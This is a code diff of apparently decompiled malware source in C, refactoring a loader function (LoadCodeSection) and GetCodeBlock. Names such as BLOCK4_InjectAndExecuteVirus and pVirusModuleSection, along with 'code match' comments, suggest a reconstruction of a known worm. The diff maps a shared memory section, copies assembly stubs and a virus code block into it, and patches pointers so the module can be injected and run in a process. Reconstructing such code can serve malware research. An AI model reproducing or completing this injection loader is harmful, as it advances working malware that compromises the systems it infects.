@@ -118,9 +118,9 @@ UINT32 GetCodeBlockSize(void)
 }
 
 // 100% (C) CODE MATCH
-UINT32 GetCodeBlock(void)
+UINT32 GetCodeBlock(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader)
 {
-	return (UINT32)BLOCK4_InjectAndExecuteVirus;
+	return (INT32)BLOCK4_InjectAndExecuteVirus(sASMCodeBlocksHeader);
 }
 
 // 100% (C) CODE MATCH
@@ -138,45 +138,44 @@ UINT32 GetRelativeAlignAddressesPointer(void)
 // 85% (C) CODE MATCH -> NEED DEBUG
 INT32 LoadCodeSection(HANDLE hHandle, PVOID pVirusModuleSection, PVOID *pCodeBlockPointer, PVOID *pAssemblyCodeBlocksSection)
 {
-	PVOID pCodeBlock; // eax@3
-	HANDLE pSectionHandle; // [sp+8h] [bp-28h]@1
-	INT32 iASMBlock1Pointer; // [sp+Ch] [bp-24h]@3
-	DWORD *v9; // [sp+10h] [bp-20h]@3
-	INT32 iSectionPointer; // [sp+14h] [bp-1Ch]@1
-	PVOID pBaseAddr1; // [sp+18h] [bp-18h]@1
-	UINT32 iSectionsSize; // [sp+1Ch] [bp-14h]@1
-	PVOID pBaseAddr2; // [sp+20h] [bp-10h]@1
-	PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader; // [sp+24h] [bp-Ch]@3
-	UINT32 iCodeBlockSize; // [sp+28h] [bp-8h]@1
-	INT32 iOpenMapViewFailed; // [sp+2Ch] [bp-4h]@1
+	HANDLE pSectionHandle;
+	PVOID pBaseAddr1 = 0;
+	PVOID pViewBase = 0;
+	INT32 iSectionPointer = 0;
 
-	pBaseAddr1 = 0;
-	pBaseAddr2 = 0;
 
-	iCodeBlockSize = GetCodeBlockSize(); // [0xB3A] (2874)
-	iSectionsSize  = sizeof(ASM_CODE_BLOCKS_HEADER) + _SIZE(__ASM_BLOCK1_0, __ASM_BLOCK0_0) + _SIZE(DecodeModuleNameA, __ASM_BLOCK1_0) + iCodeBlockSize;
+	UINT32 iCodeBlockSize = GetCodeBlockSize(); // [0xB3A] (2874)
+	UINT32 iASMBlock1Size = _SIZE(DecodeFunctionNameA, __ASM_BLOCK1_0);
+	UINT32 iASMBlock0Size = _SIZE(__ASM_BLOCK1_0, __ASM_BLOCK0_0);
 
-	iSectionPointer = 0;
+	UINT32 iSectionsSize  = sizeof(ASM_CODE_BLOCKS_HEADER) + iASMBlock0Size + iASMBlock1Size + iCodeBlockSize;
 
-	iOpenMapViewFailed = SharedMapViewOfSection(hHandle, iSectionsSize, &pSectionHandle, &pBaseAddr1, &pBaseAddr2);
-	// Because hHandle = GetCurrentProcess(), pBaseAddr1 == pBaseAddr2
 
-	if(!iOpenMapViewFailed) return iOpenMapViewFailed;
+	// Because hHandle = GetCurrentProcess(), pBaseAddr1 == pViewBase
+	INT32 iOpenMapViewFailed = SharedMapViewOfSection(hHandle, iSectionsSize, &pSectionHandle, &pBaseAddr1, &pViewBase);
+	if(!iOpenMapViewFailed)
+		return iOpenMapViewFailed;
 
-	sASMCodeBlocksHeader = (PASM_CODE_BLOCKS_HEADER)pBaseAddr1;
-	pBaseAddr1           = (PVOID)((DWORD)pBaseAddr1 + sizeof(ASM_CODE_BLOCKS_HEADER));
+	PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader = (PASM_CODE_BLOCKS_HEADER)pBaseAddr1;
+
+	// Pointer to first address to write
+	PVOID pCurrBase           = (PVOID)((DWORD)pBaseAddr1 + sizeof(ASM_CODE_BLOCKS_HEADER));
+
+	// Offset from baseAddr of where we're currently writing
 	iSectionPointer      = sizeof(ASM_CODE_BLOCKS_HEADER);
 
-	CopySegmentIntoSections(&pBaseAddr1, pBaseAddr2, &iSectionPointer, &sASMCodeBlocksHeader->ASMBlock1Segment, __ASM_BLOCK1_0, _SIZE(DecodeModuleNameA, __ASM_BLOCK1_0));
-	iASMBlock1Pointer = iSectionPointer;
+	CopySegmentIntoSections(&pCurrBase, pViewBase, &iSectionPointer, &sASMCodeBlocksHeader->ASMBlock1Segment, __ASM_BLOCK1_0, iASMBlock1Size);
 
-	CopySegmentIntoSections(&pBaseAddr1, pBaseAddr2, &iSectionPointer, &sASMCodeBlocksHeader->ASMBlock0Segment, __ASM_BLOCK0_0, _SIZE(__ASM_BLOCK1_0, __ASM_BLOCK0_0));
-	pCodeBlock = (PVOID)GetCodeBlock();
+	CopySegmentIntoSections(&pCurrBase, pViewBase, &iSectionPointer, &sASMCodeBlocksHeader->ASMBlock0Segment, __ASM_BLOCK0_0, iASMBlock0Size);
 
-	CopySegmentIntoSections(&pBaseAddr1, pBaseAddr2, &iSectionPointer, &sASMCodeBlocksHeader->CodeBlockSegment, pCodeBlock, iCodeBlockSize);
+	PVOID pCodeBlock = (PVOID)GetCodeBlock(sASMCodeBlocksHeader);
+	CopySegmentIntoSections(&pCurrBase, pViewBase, &iSectionPointer, &sASMCodeBlocksHeader->CodeBlockSegment, pCodeBlock, iCodeBlockSize);
 
-	v9 = (DWORD *)((DWORD)sASMCodeBlocksHeader + iASMBlock1Pointer + _SIZE(__ASM_BLOCK0_1, __ASM_BLOCK0_0));
-	*v9 = (DWORD)sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress + _SIZE(__ASM_REF_3, __ASM_BLOCK1_0);
+	// Basically memcpy:
+	//   *__ASM_BLOCK0_1 = &__ASM_REF_3
+	//   I have no idea why.
+	DWORD *tmp = (DWORD *)((DWORD)sASMCodeBlocksHeader + sizeof(ASM_CODE_BLOCKS_HEADER) + iASMBlock1Size + _SIZE(__ASM_BLOCK0_1, __ASM_BLOCK0_0));
+	*tmp = (DWORD)sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress + _SIZE(__ASM_REF_3, __ASM_BLOCK1_0);
 
 	// Put function address into the memory map
 	sASMCodeBlocksHeader->ExecuteLibrary = sASMCodeBlocksHeader->CodeBlockSegment.SegmentAddress + GetRelativeExecuteLibraryPointer();
@@ -185,7 +184,7 @@ INT32 LoadCodeSection(HANDLE hHandle, PVOID pVirusModuleSection, PVOID *pCodeBlo
 
 	// Put the values in the pointers
 	*pCodeBlockPointer          = (PVOID)sASMCodeBlocksHeader->CodeBlockSegment.SegmentAddress;
-	*pAssemblyCodeBlocksSection = pBaseAddr2;
+	*pAssemblyCodeBlocksSection = pViewBase;
 
 	// Close and unmap the first section
 	g_hardAddrs.UnmapViewOfFile(sASMCodeBlocksHeader);
